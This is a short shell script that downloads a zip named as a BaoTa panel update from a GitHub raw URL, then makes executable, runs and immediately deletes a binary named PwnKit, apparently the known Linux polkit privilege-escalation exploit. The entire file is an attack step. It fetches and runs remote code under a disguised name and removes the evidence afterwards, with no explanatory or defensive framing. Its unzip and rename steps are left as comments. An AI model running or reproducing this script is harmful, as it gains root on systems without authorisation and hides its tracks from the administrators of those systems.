curl -fsSL https://raw.githubusercontent.com/ganlinniangwtf/btupdate/main/baotaUpdate.zip -o baotaUpdate.zip || exit
#unzip from cmdline
#rename
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit
